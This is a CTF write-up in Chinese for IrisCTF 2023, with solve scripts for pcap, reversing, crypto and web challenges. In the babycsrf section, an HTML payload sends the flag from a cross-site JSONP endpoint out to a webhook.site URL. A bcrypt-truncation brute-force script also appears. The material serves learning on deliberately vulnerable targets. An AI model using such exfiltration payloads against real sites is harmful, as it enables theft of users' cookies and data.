# irisCTF
###### tags: `CTF`

## Welcome
### Sanity Check

```!
Welcome to IrisCTF 2023! Whether this is your 1st or 100th CTF, we want you to have a fun and pleasant experience. Maybe you can even learn something new!

Here's a freebie to introduce you to what the flag format looks like: irisctf{w31c0m3_t0_1r15ctf_2023}. Flags will follow this format unless otherwise specified.
```

如題目敘述

`irisctf{w31c0m3_t0_1r15ctf_2023}`

### Discord

```!
If you need help with a challenge, the only way to connect with us is through our Discord. Joining our Discord will also give you updates about a challenge and updates about the event.

Join our Discord and find the flag.

附件: https://discord.gg/JXvW3ft9Ac
```

discord -> misc 頻道 -> 頻道標題

![](https://i.imgur.com/fi4UunU.png)

`irisctf{d15c0rd_c0nn3cts_y0u_t0_0ur_0rg4n1z3rs}`

### Exit Survey

填問卷，填完之後得到一組 base64 字串，拿去解密即可拿到 flag

`irisctf{struggling_means_youre_learning_thank_you_and_happy_hacking}`

## Network
### babyshark

```!
I was going to call this challenge babynet, but I have that baby shark song stuck in my head... doo doo, doo doo doo baby shark...

附件: capture.zip
```

拿到一個 pcapng，用 wireshark 解析

查看 protocol hierarchy 查看有哪些 protocol

![](https://i.imgur.com/YVQtz5w.png)

發現有 data 和 http 的東東，而在 http 中有 gif 的資料

首先看 data，發現只是一些明文對話，沒有甚麼特別的，但是裡面的封包 91 有提到有傳送 gif 的行為

![](https://i.imgur.com/4zCK6oR.png)

而改用 http 作為 filter，發現在封包 307 確實有 gif 的資料，嘗試複製下來看看

![](https://i.imgur.com/IbU9dCD.png)

得到以下 gif

![](https://i.imgur.com/Cs2T8by.gif)

flag 在裡面

`irisctf{welc0m3_t0_n3tw0rks}`

## Reverse
### baby_rev

```!
I needed to edit some documents for my homework but I don't want to buy a license to this software! Help me out pls?

附件: baby_baby_rev
```

首先丟 ghidra 進行反編譯，發現這是一個要輸入密碼的程式，其中檢查密碼的方式如下

```c=16
  printf("Code: ");
  __isoc99_scanf("%99s",local_78);
  sVar1 = strlen(local_78);
  if (sVar1 == 0x20) {
    local_78[0] = local_78[0] + -0x69;
    local_78[1] = local_78[1] + -0x71;
    local_78[2] = local_78[2] + -0x67;
    //... 中間省略
    local_78[29] = local_78[29] + -0x48;
    local_78[30] = local_78[30] + -0x1c;
    local_78[31] = local_78[31] + -0x5e;
    local_7c = 0;
    while( true ) {
      if (0x1f < local_7c) {
        puts("Key Valid!");
        puts("SuperTexEdit booting up...");
                    /* WARNING: Subroutine does not return */
        abort();
      }
      if (local_7c != local_78[local_7c]) break;
      local_7c = local_7c + 1;
    }
    puts("Invalid code!");
  }
  else {
    puts("Invalid code!");
  }
```

首先會先檢查輸入長度是否為 32 個字，接著會將每個字減去一個特定的數字之後儲存，並比較儲存後的數字是否與當前 index 相同，全部相同則過關

因此只要把當前的特定數字加上 index 後，即是密碼

```python
enc = bytes.fromhex("69 71 67 70 5f 6f 60 74 65 60 59 67 63 66 61 57 64 4e 65 5c 5e 4f 49 4a 5c 46 4e 54 51 48 1c 5e")
print(bytes([c+i for i,c in enumerate(enc)]))
```

密碼即為 flag

`irisctf{microsoft_word_at_home:}`

### Meaning of Python 1

```!
Python. Python! What is Python? Is this Python? Why does this Python look so strange? All this and more on in... the... textfield...

附件: python1.py
```

:::spoiler python1.py
```python
import sys
import zlib

def apple(s, a, b):
    arr = list(s)
    tmp = arr[a]
    arr[a] = arr[b]
    arr[b] = tmp
    return "".join(arr)

def banana(s, a, b):
    arr = list(s)
    arr[a] = chr(ord(arr[a]) ^ ord(arr[b]))
    return "".join(arr)

def carrot(s, a, b):
    arr = bytearray(s)
    tmp = arr[a]
    arr[a] = arr[b]
    arr[b] = tmp
    return bytes(arr)

def donut(s, a, b):
    arr = bytearray(s)
    arr[b] ^= arr[a]
    return bytes(arr)


def scramble1(flag):
    pos = 36
    while True:
        if pos == 0:
            flag = banana(flag, 25, 41)
            pos = 29
        elif pos == 1:
            flag = apple(flag, 4, 21)
            pos = 31
        elif pos == 2:
            flag = banana(flag, 24, 41)
            pos = 41
        elif pos == 3:
            flag = banana(flag, 16, 24)
            pos = 37
        elif pos == 4:
            flag = banana(flag, 0, 43)
            pos = 32
        elif pos == 5:
            flag = banana(flag, 24, 2)
            pos = 16
        elif pos == 6:
            flag = apple(flag, 18, 29)
            pos = 38
        elif pos == 7:
            flag = banana(flag, 28, 43)
            pos = 39
        elif pos == 8:
            flag = banana(flag, 25, 26)
            pos = 12
        elif pos == 9:
            flag = apple(flag, 4, 43)
            pos = 10
        elif pos == 10:
            flag = apple(flag, 15, 42)
            pos = 26
        elif pos == 11:
            flag = banana(flag, 33, 13)
            pos = 14
        elif pos == 12:
            flag = banana(flag, 43, 2)
            pos = 24
        elif pos == 13:
            flag = apple(flag, 7, 32)
            pos = 33
        elif pos == 14:
            flag = banana(flag, 20, 38)
            pos = 27
        elif pos == 15:
            flag = banana(flag, 16, 29)
            pos = 28
        elif pos == 16:
            flag = apple(flag, 8, 15)
            pos = 0
        elif pos == 17:
            flag = apple(flag, 17, 9)
            pos = 21
        elif pos == 18:
            flag = apple(flag, 37, 32)
            pos = 22
        elif pos == 19:
            flag = banana(flag, 34, 13)
            pos = 3
        elif pos == 20:
            flag = apple(flag, 21, 17)
            pos = 7
        elif pos == 21:
            flag = banana(flag, 8, 38)
            pos = 2
        elif pos == 22:
            flag = apple(flag, 13, 25)
            pos = 30
        elif pos == 23:
            flag = banana(flag, 33, 37)
            pos = 17
        elif pos == 24:
            flag = banana(flag, 15, 22)
            pos = 6
        elif pos == 25:
            flag = apple(flag, 24, 15)
            pos = 43
        elif pos == 26:
            flag = banana(flag, 37, 26)
            pos = 11
        elif pos == 27:
            flag = apple(flag, 9, 0)
            pos = 25
        elif pos == 28:
            flag = banana(flag, 32, 0)
            pos = 42
        elif pos == 29:
            flag = banana(flag, 24, 26)
            pos = 47
        elif pos == 30:
            flag = apple(flag, 1, 2)
            pos = 9
        elif pos == 31:
            flag = banana(flag, 18, 27)
            pos = 15
        elif pos == 32:
            flag = apple(flag, 26, 28)
            pos = 49
        elif pos == 33:
            flag = banana(flag, 24, 16)
            pos = 1
        elif pos == 34:
            flag = banana(flag, 11, 39)
            pos = 46
        elif pos == 35:
            flag = banana(flag, 19, 22)
            pos = 50
        elif pos == 36:
            flag = apple(flag, 28, 27)
            pos = 5
        elif pos == 37:
            flag = apple(flag, 13, 15)
            pos = 44
        elif pos == 38:
            flag = banana(flag, 6, 29)
            pos = 23
        elif pos == 39:
            flag = apple(flag, 15, 37)
            pos = 40
        elif pos == 40:
            flag = apple(flag, 40, 23)
            pos = 4
        elif pos == 41:
            flag = apple(flag, 28, 0)
            pos = 18
        elif pos == 42:
            flag = banana(flag, 41, 19)
            pos = 19
        elif pos == 43:
            flag = apple(flag, 7, 5)
            pos = 20
        elif pos == 44:
            flag = banana(flag, 12, 40)
            pos = 35
        elif pos == 45:
            flag = apple(flag, 19, 30)
            pos = 48
        elif pos == 46:
            flag = apple(flag, 15, 4)
            pos = 13
        elif pos == 47:
            flag = apple(flag, 17, 11)
            pos = 45
        elif pos == 48:
            flag = banana(flag, 8, 28)
            pos = 8
        elif pos == 49:
            flag = banana(flag, 19, 9)
            pos = 34
        elif pos == 50:
            return

def scramble2(flag):
    pos = 48
    while True:
        if pos == 0:
            flag = carrot(flag, 13, 25)
            pos = 5
        elif pos == 1:
            flag = donut(flag, 16, 4)
            pos = 42
        elif pos == 2:
            flag = carrot(flag, 22, 4)
            pos = 41
        elif pos == 3:
            flag = donut(flag, 39, 47)
            pos = 44
        elif pos == 4:
            flag = carrot(flag, 29, 41)
            pos = 17
        elif pos == 5:
            flag = donut(flag, 18, 36)
            pos = 13
        elif pos == 6:
            flag = donut(flag, 25, 23)
            pos = 31
        elif pos == 7:
            flag = donut(flag, 37, 49)
            pos = 39
        elif pos == 8:
            flag = donut(flag, 23, 30)
            pos = 24
        elif pos == 9:
            flag = carrot(flag, 32, 11)
            pos = 38
        elif pos == 10:
            flag = donut(flag, 24, 14)
            pos = 3
        elif pos == 11:
            flag = donut(flag, 31, 23)
            pos = 26
        elif pos == 12:
            flag = donut(flag, 25, 9)
            pos = 36
        elif pos == 13:
            flag = carrot(flag, 37, 0)
            pos = 37
        elif pos == 14:
            flag = donut(flag, 30, 35)
            pos = 32
        elif pos == 15:
            flag = carrot(flag, 21, 2)
            pos = 27
        elif pos == 16:
            flag = carrot(flag, 23, 44)
            pos = 19
        elif pos == 17:
            flag = carrot(flag, 1, 51)
            pos = 29
        elif pos == 18:
            flag = carrot(flag, 21, 16)
            pos = 35
        elif pos == 19:
            flag = carrot(flag, 35, 33)
            pos = 34
        elif pos == 20:
            flag = carrot(flag, 18, 1)
            pos = 30
        elif pos == 21:
            flag = carrot(flag, 3, 27)
            pos = 45
        elif pos == 22:
            flag = donut(flag, 2, 13)
            pos = 18
        elif pos == 23:
            flag = donut(flag, 27, 50)
            pos = 10
        elif pos == 24:
            flag = carrot(flag, 27, 45)
            pos = 20
        elif pos == 25:
            flag = carrot(flag, 49, 35)
            pos = 6
        elif pos == 26:
            flag = carrot(flag, 13, 40)
            pos = 4
        elif pos == 27:
            flag = carrot(flag, 47, 50)
            pos = 8
        elif pos == 28:
            flag = donut(flag, 0, 1)
            pos = 43
        elif pos == 29:
            flag = donut(flag, 3, 34)
            pos = 49
        elif pos == 30:
            flag = donut(flag, 50, 7)
            pos = 11
        elif pos == 31:
            flag = donut(flag, 41, 9)
            pos = 23
        elif pos == 32:
            flag = donut(flag, 44, 50)
            pos = 16
        elif pos == 33:
            flag = carrot(flag, 19, 29)
            pos = 15
        elif pos == 34:
            flag = carrot(flag, 34, 47)
            pos = 40
        elif pos == 35:
            flag = carrot(flag, 24, 3)
            pos = 47
        elif pos == 36:
            flag = carrot(flag, 14, 37)
            pos = 0
        elif pos == 37:
            flag = donut(flag, 21, 29)
            pos = 25
        elif pos == 38:
            flag = donut(flag, 29, 1)
            pos = 1
        elif pos == 39:
            flag = carrot(flag, 23, 37)
            pos = 33
        elif pos == 40:
            flag = carrot(flag, 29, 44)
            pos = 12
        elif pos == 41:
            flag = donut(flag, 19, 39)
            pos = 50
        elif pos == 42:
            flag = carrot(flag, 8, 37)
            pos = 28
        elif pos == 43:
            flag = donut(flag, 40, 25)
            pos = 21
        elif pos == 44:
            flag = donut(flag, 46, 14)
            pos = 7
        elif pos == 45:
            flag = donut(flag, 36, 39)
            pos = 22
        elif pos == 46:
            flag = carrot(flag, 44, 6)
            pos = 9
        elif pos == 47:
            flag = carrot(flag, 46, 28)
            pos = 14
        elif pos == 48:
            flag = donut(flag, 16, 50)
            pos = 46
        elif pos == 49:
            flag = carrot(flag, 29, 10)
            pos = 2
        elif pos == 50:
            return

def main():
    if len(sys.argv) <= 1:
        print("Missing argument")
        exit(1)

    flag_to_check = sys.argv[1]

    flag_length = len(flag_to_check)
    if flag_length < 44:
        print("Incorrect")
        exit(1)

    scramble1(flag_to_check)

    flag_compressed = zlib.compress(flag_to_check.encode("utf-8"))

    flag_compressed_length = len(flag_compressed)
    if flag_compressed_length < 52:
        print("Incorrect")
        exit(1)

    scramble2(flag_compressed)

    if flag_compressed == b'x\x9c\xcb,\xca,N.I\xab.\xc9\xc8,\x8e7,\x8eOIM3\xcc3,1\xce\xa9\x8c7\x89/\xa8,\xc90\xc8\x8bO\xcc)2L\xcf(\xa9\x05\x00\x83\x0c\x10\xf9':
        print("Correct!")
    else:
        print("Incorrect!")

main()
```
:::

可以看到這題需要猜密碼，首先在輸入時會先檢查長度並進行 `scramble1` 運算，並使用 zlib 進行 compress，接著進行第二次檢查長度後進行 `scramble2` 運算，並比對運算結果是否與保存的字串相同，因此我們可以嘗試逆著運算回推原本的字串

可以看到，`apple` 和 `carrot` 就是交換 index a 和 index b 的值，而 `banana` 和 `donut` 就是把 index a,b 的值做 xor 後分配回 a/b，基本上反函式就是自己

而 scramble1 和 scramble2 的部分就是依據 pos 的順序呼叫 `apple`, `banana`, `carrot`, `donut` 等函式，只要想辦法拿到順序並逆著呼叫即可反推輸入

:::spoiler solve.py
```python
import zlib
from module import unscramble1, unscramble2

flag_compressed = b'x\x9c\xcb,\xca,N.I\xab.\xc9\xc8,\x8e7,\x8eOIM3\xcc3,1\xce\xa9\x8c7\x89/\xa8,\xc90\xc8\x8bO\xcc)2L\xcf(\xa9\x05\x00\x83\x0c\x10\xf9'
assert len(flag_compressed) >= 52

unscramble2(flag_compressed)
flag_to_check = zlib.decompress(flag_compressed).decode("utf-8")
assert len(flag_to_check) >= 44

unscramble1(flag_to_check)

print(flag_to_check)
```
:::

而 module 中的 unscramble1, unscramble2 如下

:::spoiler module.py
```python
def unscramble1(flag):
    ppos = [50, 36, 5, 16, 0, 29, 47, 45, 48, 8, 12, 24, 6, 38, 23, 17, 21, 2, 41, 18, 22, 30, 9, 10, 26, 11, 14, 27, 25, 43, 20, 7, 39, 40, 4, 32, 49, 34, 46, 13, 33, 1, 31, 15, 28, 42, 19, 3, 37, 44, 35]
    i = -1
    pos = ppos[i]
    while True:
        if pos == 0:
            flag = banana(flag, 25, 41)
            pos = 29
        elif pos == 1:
            flag = apple(flag, 4, 21)
            pos = 33
        # ... 中間省略
        elif pos == 49:
            flag = banana(flag, 19, 9)
            pos = 32
        elif pos == 50:
            return
        i -= 1
        pos = ppos[i]

def unscramble2(flag):
    ppos = [50, 48, 46, 9, 38, 1, 42, 28, 43, 21, 45, 22, 18, 35, 47, 14, 32, 16, 19, 34, 40, 12, 36, 0, 5, 13, 37, 25, 6, 31, 23, 10, 3, 44, 7, 39, 33, 15, 27, 8, 24, 20, 30, 11, 26, 4, 17, 29, 49, 2, 41]
    i = -1
    pos = ppos[i]
    while True:
        if pos == 0:
            flag = carrot(flag, 13, 25)
            pos = 5
        elif pos == 1:
            flag = donut(flag, 16, 4)
            pos = 42
        # ... 中間省略
        elif pos == 49:
            flag = carrot(flag, 29, 10)
            pos = 2
        elif pos == 50:
            return
        i -= 1
        pos = ppos[i]
```
:::

裡面的 ppos 就是直接在題目程式碼中插 probe 得來

`irisctf{this_1s_def1n1t3ly_4_pyth0n_alr1ght}`

## Crypto
### babynotrsa

```!
Everyone knows RSA, but everyone also knows that RSA is slow. Why not just use a faster operation than exponentiation?

附件: chal.py, output.txt
```

:::spoiler chal.py
```python
from Crypto.Util.number import getStrongPrime

# We get 2 1024-bit primes
p = getStrongPrime(1024)
q = getStrongPrime(1024)

# We calculate the modulus
n = p*q

# We generate our encryption key
import secrets
e = secrets.randbelow(n)

# We take our input
flag = b"irisctf{REDACTED_REDACTED_REDACTED}"
assert len(flag) == 35
# and convert it to a number
flag = int.from_bytes(flag, byteorder='big')

# We encrypt our input
encrypted = (flag * e) % n

print(f"n: {n}")
print(f"e: {e}")
print(f"flag: {encrypted}")
```
:::

可以看到，這題的 encrypt 的計算與一般 RSA 不同，使用的是乘法而非 pow，因此可以先算出 $e$ 的模倒數 $e_{inv}$ 之後計算 $encrypt \times e_{inv}$ 即為原來的 flag

:::spoiler solve.py
```python
from Crypto.Util.number import long_to_bytes

e_inv = pow(e, -1, n)
decrypt = (flag * e_inv)%n
print(long_to_bytes(decrypt))
```
:::

`irisctf{discrete_divide_isn't_hard}`

### babymixup

```!
I encrypted a public string and the flag with AES. There's no known key recovery attacks against AES, so you can't decrypt the flag.

附件: chal.py, output.txt
```

:::spoiler chal.py
```python
from Crypto.Cipher import AES
import os

key = os.urandom(16)

flag = b"flag{REDACTED}"
assert len(flag) % 16 == 0

iv = os.urandom(16)
cipher = AES.new(iv,  AES.MODE_CBC, key)
print("IV1 =", iv.hex())
print("CT1 =", cipher.encrypt(b"Hello, this is a public message. This message contains no flags.").hex())

iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv )
print("IV2 =", iv.hex())
print("CT2 =", cipher.encrypt(flag).hex())
```
:::

由程式可知，在第一次加密時使用 iv1 作為 key，key 作為 iv，也就是說我們可知第一次加密時的 key

根據 wiki 上的 CBC 模式解密結構圖，我們可對第一次加密後的密文先進入 AES 解密，並與第一次加密時的明文做 xor，即可獲得第一次加密時的 iv，即為 key 的變數值

![](https://i.imgur.com/nSjnn7d.png)
[source](https://zh.wikipedia.org/zh-tw/分组密码工作模式#密码块链接（CBC）)

有了 key 和第二次加密的 iv，直接解密第二次加密的密文即可獲得 flag

:::spoiler solve.py
```python
from Crypto.Cipher import AES

def xor(b1:bytes, b2:bytes):
    assert len(b1) == len(b2)
    return bytes([bb1^bb2 for bb1,bb2 in zip(b1,b2)])

IV1 = bytes.fromhex(...)
CT1 = bytes.fromhex(...)
IV2 = bytes.fromhex(...)
CT2 = bytes.fromhex(...)
pt1 = b"Hello, this is a public message. This message contains no flags."

aes = AES.new(IV1, AES.MODE_ECB)
key = xor(aes.decrypt(CT1[:16]), pt1[:16])

aes2 = AES.new(key, AES.MODE_CBC, IV2)
flag = aes2.decrypt(CT2)
print(flag)
```
:::

`irisctf{the_iv_aint_secret_either_way_using_cbc}`

### Nonces and Keys

```!
Because of our revolutionary AES-128-OFB technology we have encrypted your user data so securely that even with the key (k=0x13371337133713371337133713371337) evil hackers can't read out the passwords!!!

附件: challenge_enc.sqlite3
```

由題目敘述可知，附件中的檔案被加密過，且加密方法為 AES 的 OFB mode，key 為 `0x13371337133713371337133713371337`，此外也可從附檔名得知原始檔案為 sqlite3 的 database

從[此文件](https://www.sqlite.org/fileformat.html#:~:text=1.3.1.%20Magic%20Header%20String)中可看到，sqlite3 database 檔案的前 16 bytes 固定為 `53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00`，因此我們可知道部分明文資訊

而從 wiki 上的 OFB 模式解密結構圖可看到，只要我們將 plaintext 和 ciphertext 做 xor 運算，並使用題目提供的 key 進行 AES 解密，即可獲得初始的 iv，即可解密出原始的 database (或其實把 xor 過的資訊作為新一輪的 iv 進行解密恢復剩下資料也可)

![](https://i.imgur.com/nVnCSut.png)
[source](https://zh.wikipedia.org/zh-tw/分组密码工作模式#输出反馈（OFB）)

以下是解密的程式

:::spoiler solve.py
```python
from Crypto.Cipher import AES

def xor(b1, b2):
    assert len(b1) == len(b2)
    return bytes([bb1 ^ bb2 for bb1, bb2 in zip(b1, b2)])

with open("./challenge_enc.sqlite3", "rb") as fh:
    data_enc = fh.read()

pt = bytes.fromhex("53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00")
ct = data_enc[:16]
key = bytes.fromhex("13371337133713371337133713371337")

out = xor(pt, ct)
aes = AES.new(key, AES.MODE_ECB)
iv = aes.decrypt(out)

aes2 = AES.new(key, AES.MODE_OFB, iv)
data_plain = aes2.decrypt(data_enc)

with open("./challenge.sqlite3", "wb") as fh:
    fh.write(data_plain)
```
:::

解密出來的檔案似乎還是有點問題，不過其實裡面已經有明文資料了，使用 strings 即可獲得全部資料，flag 也在裡面

`irisctf{g0tt4_l0v3_s7re4mciph3rs}`

### SMarT 1

```!
I made a small, efficient block cipher. It's small because I can fit it on the page and it's efficient because it only uses the minimal amount of rounds. I didn't even try it but I'm sure it works. Here's some output with the key. Can you get the flag back out?

附件: output1.txt, chal.py
```

:::spoiler chal.py
```python
from pwn import xor

# I don't know how to make a good substitution box so I'll refer to AES. This way I'm not actually rolling my own crypto
SBOX = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]

TRANSPOSE = [[3, 1, 4, 5, 6, 7, 0, 2],
 [1, 5, 7, 3, 0, 6, 2, 4],
 [2, 7, 5, 4, 0, 6, 1, 3],
 [2, 0, 1, 6, 4, 3, 5, 7],
 [6, 5, 0, 3, 2, 4, 1, 7],
 [2, 0, 6, 1, 5, 7, 4, 3],
 [1, 6, 2, 5, 0, 7, 4, 3],
 [4, 5, 6, 1, 2, 3, 7, 0]]

RR = [4, 2, 0, 6, 9, 3, 5, 7]
def rr(c, n):
    n = n % 8
    return ((c << (8 - n)) | (c >> n)) & 0xff

import secrets
ROUNDS = 2
MASK = secrets.token_bytes(8)
KEYLEN = 4 + ROUNDS * 4
def encrypt(block, key):
    assert len(block) == 8
    assert len(key) == KEYLEN
    block = bytearray(block)

    for r in range(ROUNDS):
        block = bytearray(xor(block, key[r*4:(r+2)*4]))
        for i in range(8):
            block[i] = SBOX[block[i]]
            block[i] = rr(block[i], RR[i])

        temp = bytearray(8)
        for i in range(8):
            for j in range(8):
                temp[j] |= ((block[i] >> TRANSPOSE[i][j]) & 1) << i

        block = temp

        block = xor(block, MASK)
    return block

def ecb(pt, key):
    if len(pt) % 8 != 0:
        pt = pt.ljust(len(pt) + (8 - len(pt) % 8), b"\x00")

    out = b""
    for i in range(0, len(pt), 8):
        out += encrypt(pt[i:i+8], key)
    return out

key = secrets.token_bytes(KEYLEN)
FLAG = b"irisctf{redacted}"
print(f"MASK: {MASK.hex()}")
print(f"key: {key.hex()}")
import json
pairs = []
for i in range(8):
    pt = secrets.token_bytes(8)
    pairs.append([pt.hex(), encrypt(pt, key).hex()])
print(f"some test pairs: {json.dumps(pairs)}")
print(f"flag: {ecb(FLAG, key).hex()}")
```
:::

題目製造了一個長得跟 AES 很像的東東，並給了一些測試資料與 key，要求求出原本的 plaintext

這題沒什麼好說的，就是想辦法建立 decrypt 函式，並解密，這題應該放 reverse ㄅ

總之，以下是 decrypt 的部分

:::spoiler solve.py
```python
ROUNDS = 2
KEYLEN = 4 + ROUNDS * 4
SBOX = ...
TRANSPOSE = ...
RR = ...
INV_SBOX = [0 for _ in range(len(SBOX))]
for i,sbox in enumerate(SBOX):
    INV_SBOX[sbox] = i
def ll(c, n):
    n = n % 8
    return ((c >> (8 - n)) | (c << n)) & 0xff

def decrypt(block, key):
    assert len(block) == 8
    assert len(key) == KEYLEN
    block = bytearray(block)

    for r in range(ROUNDS-1, -1, -1):
        block = bytearray(xor(block, MASK))
        
        temp = bytearray(8)
        for i in range(7,-1,-1):
            for j in range(7, -1, -1):
                temp[i] |= ((block[j] >> i) & 1) << TRANSPOSE[i][j]
        block = temp

        for i in range(7, -1, -1):
            block[i] = ll(block[i], RR[i])
            block[i] = INV_SBOX[block[i]]

        block = xor(block, key[r*4:(r+2)*4])
    return block

def ecb(pt, key):
    if len(pt) % 8 != 0:
        pt = pt.ljust(len(pt) + (8 - len(pt) % 8), b"\x00")

    out = b""
    for i in range(0, len(pt), 8):
        out += decrypt(pt[i:i+8], key)
    return out

MASK = bytes.fromhex(...)
testpair = ...
for p,c in testpair:
    dec = decrypt(bytes.fromhex(c), key)
    assert dec == bytes.fromhex(p), f"plain = {p}, cipher = {c}, dec = {dec.hex()}"

flag_enc = bytes.fromhex(...)
flag = ecb(flag_enc, key)
print(flag)
```
:::

`irisctf{ok_at_least_it_works}`

## Web
### babystrechy

```!
More byte mean more secure

Although this is a web challenge, the script is ran directly with PHP because it doesn't need to have a website attached. Run the command below to connect!

附件: nc stretchy.chal.irisc.tf 10704, chal.php
```

:::spoiler chal.php
```php=
<?php
$password = exec("openssl rand -hex 64");

$stretched_password = "";
for($a = 0; $a < strlen($password); $a++) {
    for($b = 0; $b < 64; $b++)
        $stretched_password .= $password[$a];
}

echo "Fear my 4096 byte password!\n> ";

$h = password_hash($stretched_password, PASSWORD_DEFAULT);

while (FALSE !== ($line = fgets(STDIN))) {
    if(password_verify(trim($line), $h)) die(file_get_contents("flag"));
    echo "> ";
}
die("No!");

?>
```
:::

可以看到，此程式首先會產生 64 hex 的隨機密碼，並對其中的每個 hex 個別重複 64 次，而我們需要通過檢查得到 flag

而這題的檢查方式是先將延伸過的密碼做 [password_hash](https://www.php.net/manual/en/function.password-hash.php) 之後用 [password_verify](https://www.php.net/manual/en/function.password-verify.php) 做驗證

而在 manual 中可以看到，`PASSWORD_DEFAULT` 基本上是使用 bcrypt 的 hashing 演算法，與 `PASSWORD_BCRYPT` 相同，而在 parameters 的段落有提到在 `PASSWORD_BCRYPT` 模式下，password 長度會被 truncate 到最多 72 bytes 而已，如下實驗所示

```php
>>> $password = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff11111111"
=> "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff11111111"

>>> strlen($password)
=> 72

>>> $hash = password_hash($password, PASSWORD_DEFAULT)
=> "$2y$10$Bt9KgKoteTrqkkbf5EZAuO2lrYstOIx02aqCYCpIqqOGudel/yQbi"

>>> password_verify($password, $hash)
=> true

>>> password_verify($password."1", $hash)
=> true

>>> password_verify($password."2", $hash)
=> true
```

也就是說，我們並非要猜完整的 64 個 hex，而是只要猜 stretched_password 前面的 72 bytes，也就是只要猜 2 個 hex 即可 (64 + 8 = 72)，僅有 256 種可能，可以透過以下腳本產生這 256 個輸入

:::spoiler solve.py
```python
 for i in "0123456789abcdef":
    for j in "0123456789abcdef":
        print(i*64+j*8)
```
:::

btw，因為題目程式裡使用的是 fgets 讀取輸入，一次只吃一行的資料，與 c 語言類似，因此可以將上面腳本產生出來的輸入全部複製進輸入並給它自己慢慢跑，不用一行一行慢慢貼

`irisctf{truncation_silent_and_deadly}`

### babycsrf

```!
JSONP is a old pattern for getting data into JS, but I heard it's insecure because an attacker can specify code instead of a function name. I solved this problem by not letting you change the name.

For this challenge you will need to submit a URL to the admin bot (a program that runs a browser and directs it to visit your URL, simulating a real person clicking your link). I recommend learning how to use ngrok if you don't know how to expose local solutions to the internet - I've also provided a template server using Python and Flask for your solution.

附件: https://babycsrf-web.chal.irisc.tf, nc babycsrfadminbot.chal.irisc.tf 10705, chal.zip, solve_template.zip
```

題目給了一個網址，以及其原始碼

:::spoiler home.html
```htmlembedded
<!DOCTYPE html>
<html>
    <body>
        <h4>Welcome to my home page!</h4>
        Message of the day: <span id="message">(loading...)</span>
        <script>
window.setMessage = (m) => {
    document.getElementById("message").innerText = m;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "/api";
    document.body.appendChild(s);
}
        </script>
    </body>
</html>
```
:::

:::spoiler chal.py
```python
from flask import Flask, request

app = Flask(__name__)

with open("home.html") as home:
    HOME_PAGE = home.read()

@app.route("/")
def home():
    return HOME_PAGE

@app.route("/api")
def page():
    secret = request.cookies.get("secret", "EXAMPLEFLAG")
    return f"setMessage('irisctf{{{secret}}}');"

app.run(port=12345)
```
:::

可以看到，這個網站有兩個路徑，`/` 會回傳 `home.html` 的內容，`/api` 會吃 cookie 並回傳包裝過的內容

很明顯的，從題目名稱和說明可知道這題是要做 csrf 攻擊，且看起來是要偷 `/api` 回傳的 flag 內容

因此我們可以用跨站請求的方式呼叫此網站的 `/api`，並以 script 的方式引入，並且撰寫 `setMessage` 函數將內容偷出來，以下是程式碼，其中 webhook 的部分需要自行更改

:::spoiler solve.html
```htmlembedded
<!DOCTYPE html>
<html>
    <body>
        Challenge Solution HTML
        Message of the day: <span id="message">(loading...)</span>
        <script>
        window.setMessage = (m) => {
            document.getElementById("message").innerText = m;
            var request = new XMLHttpRequest();
            request.open("GET", "https://webhook.site/2a29e662-2c84-4c37-9a22-46c9c3228068/?a="+m);
            request.send();
        }
        </script> 
        <script src="https://babycsrf-web.chal.irisc.tf/api"></script>
    </body>
</html>
```
:::

而此外也因為需要公用 ip 的關係，需要額外用 python 撰寫伺服器的部分並使用 ngrok 映射出來，python 的部分如下

:::spoiler solve_template.py
```python
from flask import Flask, request
import time
import requests

app = Flask(__name__)

with open("solve.html") as f:
    SOLVE = f.read()

@app.route("/")
def home():
    return SOLVE

# Run "ngrok http 12345"
# and submit the resulting https:// url to the admin bot
app.run(port=12345)
```
:::

接著就是啟動並丟給題目的機器人就行了，另外在自己測試時測不出效果是正常的因為 chrome 和 firefox 本身有做 csrf 防護

`irisctf{jsonp_is_never_the_answer}`

### (X) Feeling Tagged

```!
Check out my new note service! It supports all the formatting you'll ever need.

Flag is in admin's cookies.

附件: https://tagged-web.chal.irisc.tf/, nc taggedadminbot.chal.irisc.tf 10701, tagged.py, Dockerfile
```

:::spoiler Dockerfile
```dockerfile
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
FROM python:3.11.1

